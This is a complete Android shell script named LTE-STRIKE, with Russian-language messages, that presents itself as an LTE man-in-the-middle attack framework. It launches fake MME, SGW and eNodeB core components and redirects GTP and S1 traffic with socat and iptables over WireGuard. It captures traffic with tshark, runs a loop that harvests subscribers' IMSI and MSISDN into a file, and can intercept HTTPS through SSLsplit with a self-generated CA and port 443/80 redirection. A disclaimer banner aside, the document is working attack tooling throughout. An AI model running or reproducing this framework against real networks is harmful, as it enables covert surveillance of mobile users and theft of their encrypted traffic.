#!/system/bin/sh
# LTE-STRIKE.sh - Complete LTE MITM Attack Framework for Andrax
# Engineering purposes only

VERSION="1.1"
AUTHOR="LTE Security Research Team"
WG_INTERFACE="wg0"
WG_IP="10.8.0.2"
PUBLIC_IP=$(curl -s ifconfig.me 2>/dev/null || echo "YOUR_PUBLIC_IP")

# Get script directory for configs
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Config paths in the same directory as script
SGW_CONFIG="$SCRIPT_DIR/sgw.yml"
ENB_CONFIG="$SCRIPT_DIR/enb.yml"
MME_CONFIG="$SCRIPT_DIR/mme.yml"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Global variables
SGW_PID=""
ENB_PID=""
MME_PID=""
SOCAT_PIDS=""
SSLSPLIT_PID=""
TSHARK_PID=""

# ========================================
# UTILITY FUNCTIONS
# ========================================

print_banner() {
    clear
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║                  LTE-STRIKE v$VERSION                          ║"
    echo "║           Advanced LTE MITM Attack Framework             ║"
    echo "║                    $AUTHOR                    ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${RED}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║     Engineering and research purposes only!              ║${NC}"
    echo -e "${RED}║     Ensure proper authorization before use.              ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

error_handler() {
    local error_msg="$1"
    print_error "Ошибка"
    echo "$error_msg"
    echo ""
    print_warning "Возможные решения:"
    echo "  1. Переподключитесь к WireGuard"
    echo "  2. Проверьте GTP-U kernel module"
    echo "  3. Измените WG IP в начале скрипта"
    echo "  4. Проверьте конфигурацию SGW и eNB"
    echo ""
    echo "Для устранения неполадок:"
    echo "  - Проверьте логи в /data/local/tmp/"
    echo "  - Убедитесь что WireGuard подключен с IP: $WG_IP"
    echo "  - Проверьте что конфиги существуют:"
    echo "    - $MME_CONFIG"
    echo "    - $ENB_CONFIG"
    echo "    - $SGW_CONFIG"
    exit 1
}

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        error_handler "This script requires root privileges!"
    fi
}

check_wireguard() {
    print_warning "ВАЖНО: Скрипт предполагает что вы уже подключены к WireGuard!"
    print_info "Проверка подключения WireGuard..."
    
    if ! ip link show $WG_INTERFACE >/dev/null 2>&1; then
        print_warning "WireGuard interface $WG_INTERFACE не найден!"
        print_info "Убедитесь что WireGuard подключен с IP: $WG_IP"
        return 1
    fi
    
    local wg_ip_check=$(ip addr show $WG_INTERFACE 2>/dev/null | grep "inet " | awk '{print $2}')
    if [ -z "$wg_ip_check" ]; then
        print_warning "WireGuard interface $WG_INTERFACE не имеет IP адреса!"
        print_info "Настройте WireGuard с IP: $WG_IP"
        return 1
    fi
    
    print_success "WireGuard подключен: $WG_INTERFACE ($wg_ip_check)"
    print_info "WireGuard IP в скрипте: $WG_IP"
    if ! echo "$wg_ip_check" | grep -q "$WG_IP"; then
        print_warning "IP в скрипте ($WG_IP) не совпадает с IP интерфейса ($wg_ip_check)"
        print_info "Измените переменную WG_IP в начале скрипта"
    fi
    
    return 0
}

cleanup() {
    print_info "Остановка всех процессов..."
    
    # Kill processes in reverse order
    [ -n "$SSLSPLIT_PID" ] && kill $SSLSPLIT_PID 2>/dev/null && print_info "SSLsplit остановлен"
    [ -n "$TSHARK_PID" ] && kill $TSHARK_PID 2>/dev/null && print_info "Tshark остановлен"
    pkill -f "socat.*(36412|2123|2152|8080)" 2>/dev/null && print_info "SOCAT процессы остановлены"
    [ -n "$ENB_PID" ] && kill $ENB_PID 2>/dev/null && print_info "eNB остановлен"
    [ -n "$SGW_PID" ] && kill $SGW_PID 2>/dev/null && print_info "SGW остановлен"
    [ -n "$MME_PID" ] && kill $MME_PID 2>/dev/null && print_info "MME остановлен"
    
    # Reset iptables
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null
    
    print_success "Очистка завершена"
    exit 0
}

# ========================================
# CORE FUNCTIONS
# ========================================

setup_iptables() {
    print_info "Настройка iptables для LTE MITM..."
    
    # Reset
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null
    
    # Enable forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    
    # Redirect GTP traffic
    iptables -t nat -A OUTPUT -p udp --dport 2123 -j DNAT --to-destination $WG_IP:2123 2>/dev/null
    iptables -t nat -A OUTPUT -p udp --dport 2152 -j DNAT --to-destination $WG_IP:2152 2>/dev/null
    
    # Masquerade traffic
    iptables -t nat -A POSTROUTING -o $WG_INTERFACE -j MASQUERADE 2>/dev/null
    
    # Allow forwarding
    iptables -A FORWARD -i $WG_INTERFACE -j ACCEPT 2>/dev/null
    iptables -A FORWARD -o $WG_INTERFACE -j ACCEPT 2>/dev/null
    
    # Allow GTP ports
    iptables -A INPUT -p udp --dport 2123 -j ACCEPT 2>/dev/null
    iptables -A INPUT -p udp --dport 2152 -j ACCEPT 2>/dev/null
    iptables -A INPUT -p udp --dport 36412 -j ACCEPT 2>/dev/null
    
    print_success "iptables правила настроены"
}

start_mme() {
    local config_file="${1:-$MME_CONFIG}"
    
    print_info "Запуск fake MME..."
    
    if [ ! -f "$config_file" ]; then
        print_warning "Конфиг MME не найден: $config_file"
        print_info "Создание конфига MME..."
        create_mme_config "$config_file"
    fi
    
    # Kill existing MME
    pkill -f "mme.*$config_file" 2>/dev/null
    sleep 1
    
    # Start MME
    mme -config "$config_file" > /data/local/tmp/mme.log 2>&1 &
    MME_PID=$!
    
    sleep 5
    
    if ps | grep -q "$MME_PID.*mme"; then
        print_success "MME запущен (PID: $MME_PID)"
        print_info "Лог: /data/local/tmp/mme.log"
        
        # Extract MME IP
        MME_S1C_ADDR=$(grep "s1c_addr:" "$config_file" 2>/dev/null | awk '{print $2}' | tr -d '"' || echo "127.0.1.12:36412")
        print_info "MME слушает на: $MME_S1C_ADDR"
        return 0
    else
        error_handler "Ошибка запуска MME\nПроверьте /data/local/tmp/mme.log"
        return 1
    fi
}

start_sgw() {
    local config_file="${1:-$SGW_CONFIG}"
    
    print_info "Запуск fake SGW..."
    
    if [ ! -f "$config_file" ]; then
        print_warning "Конфиг SGW не найден: $config_file"
        print_info "Создание конфига SGW..."
        create_sgw_config "$config_file"
    fi
    
    # Kill existing SGW
    pkill -f "sgw.*$config_file" 2>/dev/null
    sleep 1
    
    # Start SGW
    sgw -config "$config_file" > /data/local/tmp/sgw.log 2>&1 &
    SGW_PID=$!
    
    sleep 5
    
    if ps | grep -q "$SGW_PID.*sgw"; then
        print_success "SGW запущен (PID: $SGW_PID)"
        print_info "Лог: /data/local/tmp/sgw.log"
        
        # Extract SGW IP
        SGW_S11_IP=$(grep -A1 "local_addresses:" "$config_file" 2>/dev/null | grep "s11_ip" | awk '{print $2}' | tr -d '"' || echo "10.8.0.2")
        print_info "SGW S11 слушает на: $SGW_S11_IP:2123"
        return 0
    else
        error_handler "Ошибка запуска SGW\nПроверьте /data/local/tmp/sgw.log"
        return 1
    fi
}

start_enb() {
    local config_file="${1:-$ENB_CONFIG}"
    
    print_info "Запуск fake eNodeB..."
    
    if [ ! -f "$config_file" ]; then
        print_warning "Конфиг eNodeB не найден: $config_file"
        print_info "Создание конфига eNodeB..."
        create_enb_config "$config_file"
    fi
    
    # Kill existing eNodeB
    pkill -f "eNodeB.*$config_file" 2>/dev/null
    sleep 1
    
    # Start eNodeB
    eNodeB -config "$config_file" > /data/local/tmp/enb.log 2>&1 &
    ENB_PID=$!
    
    sleep 8  # Longer wait for eNodeB to connect to MME
    
    if ps | grep -q "$ENB_PID.*eNodeB"; then
        # Check connection to MME
        if tail -10 /data/local/tmp/enb.log 2>/dev/null | grep -q "Established S1-MME connection"; then
            print_success "eNodeB запущен (PID: $ENB_PID) и подключен к MME"
        else
            print_warning "eNodeB запущен но возможно не подключен к MME"
        fi
        
        print_info "Лог: /data/local/tmp/enb.log"
        
        # Extract eNodeB IP
        ENB_S1U_IP=$(grep -A1 "local_addresses:" "$config_file" 2>/dev/null | grep "s1u_ip" | awk '{print $2}' | tr -d '"' || echo "127.0.0.11")
        print_info "eNodeB S1-U слушает на: $ENB_S1U_IP:2152"
        return 0
    else
        error_handler "Ошибка запуска eNodeB\nПроверьте /data/local/tmp/enb.log"
        return 1
    fi
}

setup_socat_redirects() {
    print_info "Настройка SOCAT редиректов..."
    
    # Get IPs from configs
    MME_S1C_ADDR=$(grep "s1c_addr:" "$MME_CONFIG" 2>/dev/null | awk '{print $2}' | tr -d '"' || echo "127.0.1.12:36412")
    ENB_S1U_IP=$(grep -A1 "local_addresses:" "$ENB_CONFIG" 2>/dev/null | grep "s1u_ip" | awk '{print $2}' | tr -d '"' || echo "127.0.0.11")
    SGW_S11_IP=$(grep -A1 "local_addresses:" "$SGW_CONFIG" 2>/dev/null | grep "s11_ip" | awk '{print $2}' | tr -d '"' || echo "10.8.0.2")
    
    # Kill existing socat
    pkill -f "socat.*(36412|2123|2152)" 2>/dev/null
    sleep 1
    
    # S1-MME (36412) → MME
    print_info "Редирект S1-MME (36412) → MME..."
    socat UDP4-LISTEN:36412,bind=0.0.0.0,fork,reuseaddr \
        UDP4:$MME_S1C_ADDR > /data/local/tmp/socat_mme.log 2>&1 &
    SOCAT_PIDS="$SOCAT_PIDS $!"
    
    # S1-U (2152) → eNodeB
    print_info "Редирект S1-U (2152) → eNodeB..."
    socat UDP4-LISTEN:2152,bind=0.0.0.0,fork,reuseaddr \
        UDP4:$ENB_S1U_IP:2152 > /data/local/tmp/socat_enb.log 2>&1 &
    SOCAT_PIDS="$SOCAT_PIDS $!"
    
    # S11 (2123) → SGW (via WireGuard)
    print_info "Редирект S11 (2123) → SGW через WireGuard..."
    socat UDP4-LISTEN:2123,bind=0.0.0.0,fork,reuseaddr \
        UDP4:$WG_IP:2123 > /data/local/tmp/socat_sgw.log 2>&1 &
    SOCAT_PIDS="$SOCAT_PIDS $!"
    
    sleep 2
    
    SOCAT_COUNT=$(ps | grep -c "socat")
    if [ "$SOCAT_COUNT" -ge 3 ]; then
        print_success "SOCAT редиректы настроены ($SOCAT_COUNT процессов)"
    else
        print_warning "Некоторые SOCAT процессы возможно не запустились"
    fi
}

start_sniffing() {
    print_info "Запуск перехвата трафика..."
    
    # Kill existing tshark
    pkill -f "tshark.*gtp" 2>/dev/null
    
    # Start tshark for GTP monitoring
    tshark -i $WG_INTERFACE \
        -f "udp port 2123 or udp port 2152 or udp port 36412" \
        -Y "gtp" \
        -T fields \
        -e frame.time \
        -e ip.src \
        -e ip.dst \
        -e gtp.message \
        -e gtp.imsi \
        -e gtp.teid \
        -l > /data/local/tmp/gtp_traffic.log 2>&1 &
    TSHARK_PID=$!
    
    sleep 2
    
    if ps | grep -q "$TSHARK_PID.*tshark"; then
        print_success "Перехват трафика запущен (PID: $TSHARK_PID)"
        print_info "Лог GTP трафика: /data/local/tmp/gtp_traffic.log"
        
        # Start IMSI catcher in background
        (
            echo "[IMSI Catcher] Запущен..."
            while true; do
                if [ -f /data/local/tmp/gtp_traffic.log ]; then
                    tail -f /data/local/tmp/gtp_traffic.log 2>/dev/null | while read line; do
                        if echo "$line" | grep -q "imsi="; then
                            IMSI=$(echo "$line" | grep -o "imsi=[0-9]*" | cut -d= -f2)
                            MSISDN=$(echo "$line" | grep -o "msisdn=[0-9]*" | cut -d= -f2)
                            TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
                            if [ -n "$IMSI" ]; then
                                echo "[$TIMESTAMP] IMSI: $IMSI, MSISDN: $MSISDN" >> /data/local/tmp/imsi_caught.txt
                                echo -e "${GREEN}[+]${NC} Найден IMSI: $IMSI"
                            fi
                        fi
                    done
                fi
                sleep 1
            done
        ) &
        
        return 0
    else
        print_warning "Не удалось запустить tshark, продолжаем без перехвата"
        return 1
    fi
}

start_sslsplit() {
    local enable_ssl="$1"
    
    if [ "$enable_ssl" != "true" ]; then
        return 0
    fi
    
    print_info "Запуск SSLsplit для HTTPS перехвата..."
    
    if ! command -v sslsplit >/dev/null 2>&1; then
        print_warning "sslsplit не найден, пропускаем HTTPS перехват"
        return 1
    fi
    
    # Create certs directory
    mkdir -p /data/local/tmp/ssl_certs 2>/dev/null
    
    # Generate CA cert if needed
    if [ ! -f /data/local/tmp/ssl_certs/ca.key ]; then
        print_info "Генерация CA сертификата..."
        openssl genrsa -out /data/local/tmp/ssl_certs/ca.key 2048 2>/dev/null
        openssl req -new -x509 -days 3650 \
            -key /data/local/tmp/ssl_certs/ca.key \
            -out /data/local/tmp/ssl_certs/ca.crt \
            -subj "/C=US/ST=State/L=City/O=Organization/CN=LTE-STRIKE CA" 2>/dev/null
    fi
    
    # Kill existing sslsplit
    pkill -f sslsplit 2>/dev/null
    sleep 1
    
    # Start SSLsplit
    sslsplit -D \
        -l /data/local/tmp/sslsplit.log \
        -j /data/local/tmp/ssl_certs \
        -S /data/local/tmp/ssl_certs/logdir \
        -k /data/local/tmp/ssl_certs/ca.key \
        -c /data/local/tmp/ssl_certs/ca.crt \
        ssl 0.0.0.0 8080 \
        tcp 0.0.0.0 8081 > /dev/null 2>&1 &
    SSLSPLIT_PID=$!
    
    sleep 2
    
    if ps | grep -q "sslsplit"; then
        print_success "SSLsplit запущен (PID: $SSLSPLIT_PID)"
        print_info "HTTP прокси: $WG_IP:8081"
        print_info "HTTPS прокси: $WG_IP:8080"
        print_info "CA сертификат: /data/local/tmp/ssl_certs/ca.crt"
        
        # Redirect HTTP/HTTPS traffic
        iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination $WG_IP:8080 2>/dev/null
        iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination $WG_IP:8081 2>/dev/null
        
        return 0
    else
        print_warning "Не удалось запустить SSLsplit"
        return 1
    fi
}

# ========================================
# CONFIG CREATION FUNCTIONS
# ========================================

create_sgw_config() {
    local config_file="$1"
    
    cat > "$config_file" << 'EOF'
local_addresses:
  s11_ip: "10.8.0.2"  # WireGuard IP - ИЗМЕНИТЕ ЕСЛИ НУЖНО
  s1u_ip: "127.0.0.13"
  s5c_ip: "127.0.1.14"
  s5u_ip: "127.0.0.14"
use_kernel_gtp: false
prom_addr: "127.0.10.3:58080"
EOF
    
    print_success "Создан конфиг SGW: $config_file"
}

create_enb_config() {
    local config_file="$1"
    
    cat > "$config_file" << 'EOF'
mcc: "001"
mnc: "01"
rat_type: 6 # E-UTRAN
tai: 0x0001
eci: 0x00000001
local_addresses:
  s1c_ip: "127.0.1.11"
  s1u_ip: "127.0.0.11"
mme_addr: "127.0.1.12:36412"
use_kernel_gtp: false
prom_addr: "127.0.10.1:58080"
subscribers:
  - imsi: "001010000000001"
    msisdn: "814000000001"
    imeisv: "1234500000001"
    src_ip: "192.168.101.201"
    i_tei: 1
    type: "http_get"
    euu_if_name: "lo"
    http_url: "http://172.16.0.102/"
    reattach_on_reload: false
EOF
    
    print_success "Создан конфиг eNodeB: $config_file"
}

create_mme_config() {
    local config_file="$1"
    
    cat > "$config_file" << 'EOF'
mcc: "001"
mnc: "01"
apn: "internet"
local_addresses:
  s1c_addr: "127.0.1.12:36412"
  s11_ip: "127.0.1.12"
sgw_s11_ip: "10.8.0.2"  # Укажите ваш WG IP здесь
pgw_s5c_ip: "127.0.1.15"
prom_addr: "127.0.10.2:58080"
EOF
    
    print_success "Создан конфиг MME: $config_file"
}

# ========================================
# MAIN EXECUTION
# ========================================

run_full_attack() {
    print_banner
    
    print_warning "ИНЖЕНЕРНОЕ ИСПОЛЬЗОВАНИЕ ТОЛЬКО!"
    print_info "Конфиги находятся в: $SCRIPT_DIR"
    
    # Check prerequisites
    check_root
    check_wireguard
    
    print_info "Начинаем запуск в правильном порядке..."
    echo ""
    
    # 1. MME on
    print_info "1. Запуск MME..."
    start_mme || error_handler "Ошибка запуска MME"
    
    # 2. SGW on
    print_info "2. Запуск SGW..."
    start_sgw || error_handler "Ошибка запуска SGW"
    
    # 3. eNB on
    print_info "3. Запуск eNodeB..."
    start_enb || error_handler "Ошибка запуска eNodeB"
    
    # 4. SOCAT on
    print_info "4. Настройка SOCAT редиректов..."
    setup_socat_redirects
    
    # 5. Sniffing started
    print_info "5. Запуск перехвата трафика..."
    start_sniffing
    
    # 6. SSLsplit on (optional)
    print_info "6. Настройка SSLsplit (опционально)..."
    start_sslsplit "$ENABLE_SSLSPLIT"
    
    # Setup iptables
    setup_iptables
    
    # Show status
    show_status
    
    # Keep running
    print_info "Нажмите Ctrl+C для остановки..."
    trap cleanup INT TERM
    wait
}

show_status() {
    echo ""
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                    LTE-STRIKE STATUS                     ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}Конфигурация:${NC}"
    echo "  Скрипт:      $0"
    echo "  Директория:  $SCRIPT_DIR"
    echo "  Public IP:   $PUBLIC_IP"
    echo "  WireGuard:   $WG_INTERFACE ($WG_IP)"
    echo ""
    echo -e "${YELLOW}Состояние процессов:${NC}"
    [ -n "$MME_PID" ] && echo "  ✓ MME:      PID $MME_PID"
    [ -n "$SGW_PID" ] && echo "  ✓ SGW:      PID $SGW_PID"
    [ -n "$ENB_PID" ] && echo "  ✓ eNodeB:   PID $ENB_PID"
    [ -n "$TSHARK_PID" ] && echo "  ✓ Sniffing: PID $TSHARK_PID"
    if [ "$ENABLE_SSLSPLIT" = "true" ] && [ -n "$SSLSPLIT_PID" ]; then
        echo "  ✓ SSLsplit: PID $SSLSPLIT_PID"
    fi
    echo ""
    echo -e "${YELLOW}Порты:${NC}"
    echo "  S1-MME: 0.0.0.0:36412 → MME"
    echo "  S11:    0.0.0.0:2123  → SGW"
    echo "  S1-U:   0.0.0.0:2152  → eNodeB"
    if [ "$ENABLE_SSLSPLIT" = "true" ]; then
        echo "  HTTPS:  0.0.0.0:8080"
        echo "  HTTP:   0.0.0.0:8081"
    fi
    echo ""
    echo -e "${YELLOW}Логи:${NC}"
    echo "  GTP трафик: /data/local/tmp/gtp_traffic.log"
    echo "  IMSI сбор:  /data/local/tmp/imsi_caught.txt"
    echo "  MME:        /data/local/tmp/mme.log"
    echo "  SGW:        /data/local/tmp/sgw.log"
    echo "  eNodeB:     /data/local/tmp/enb.log"
    echo ""
    print_warning "Используйте './LTE-STRIKE.sh --stop' для остановки"
}

show_help() {
    print_banner
    echo "Использование: ./LTE-STRIKE.sh [ОПЦИИ]"
    echo ""
    echo "Основные опции:"
    echo "  -h, --help              Показать эту справку"
    echo "  --full                  Запуск полной атаки LTE MITM"
    echo "  --sslsplit              Включить HTTPS перехват"
    echo "  --stop                  Остановить все процессы"
    echo "  --status                Показать текущий статус"
    echo ""
    echo "Отдельные компоненты:"
    echo "  --mme                   Запустить только MME"
    echo "  --sgw                   Запустить только SGW"
    echo "  --enb                   Запустить только eNodeB"
    echo "  --monitor               Запустить только мониторинг"
    echo "  --socat                 Настроить только SOCAT редиректы"
    echo ""
    echo "Примеры:"
    echo "  ./LTE-STRIKE.sh --full               # Полная атака"
    echo "  ./LTE-STRIKE.sh --full --sslsplit    # С HTTPS перехватом"
    echo "  ./LTE-STRIKE.sh --mme --sgw --enb    # Только компоненты"
    echo "  ./LTE-STRIKE.sh --status             # Статус"
    echo "  ./LTE-STRIKE.sh --stop               # Остановка"
    echo ""
    echo -e "${RED}ВАЖНО:${NC}"
    echo "  1. WireGuard должен быть подключен ДО запуска скрипта"
    echo "  2. Проверьте WG_IP переменную в начале скрипта"
    echo "  3. Конфиги создаются в папке со скриптом"
    echo "  4. Только для инженерных целей!"
    echo ""
    print_warning "При ошибках проверьте логи в /data/local/tmp/"
}

# ========================================
# COMMAND LINE PARSING
# ========================================

ENABLE_SSLSPLIT="false"

# Parse command line arguments
if [ $# -eq 0 ]; then
    show_help
    exit 0
fi

# Trap errors
trap 'error_handler "Непредвиденная ошибка"' ERR

while [ $# -gt 0 ]; do
    case $1 in
        -h|--help)
            show_help
            exit 0
            ;;
        --full)
            run_full_attack
            exit 0
            ;;
        --mme)
            shift
            CONFIG_FILE="$MME_CONFIG"
            if [ "$1" = "--file" ] && [ -n "$2" ]; then
                CONFIG_FILE="$2"
                shift 2
            fi
            start_mme "$CONFIG_FILE"
            ;;
        --sgw)
            shift
            CONFIG_FILE="$SGW_CONFIG"
            if [ "$1" = "--file" ] && [ -n "$2" ]; then
                CONFIG_FILE="$2"
                shift 2
            fi
            start_sgw "$CONFIG_FILE"
            ;;
        --enb)
            shift
            CONFIG_FILE="$ENB_CONFIG"
            if [ "$1" = "--file" ] && [ -n "$2" ]; then
                CONFIG_FILE="$2"
                shift 2
            fi
            start_enb "$CONFIG_FILE"
            ;;
        --sslsplit)
            ENABLE_SSLSPLIT="true"
            print_info "SSLsplit будет включен при полном запуске"
            ;;
        --monitor)
            start_sniffing
            ;;
        --socat)
            setup_socat_redirects
            ;;
        --status)
            show_status
            ;;
        --stop)
            cleanup
            ;;
        *)
            print_error "Неизвестная опция: $1"
            show_help
            exit 1
            ;;
    esac
    shift
done

# If still running
show_status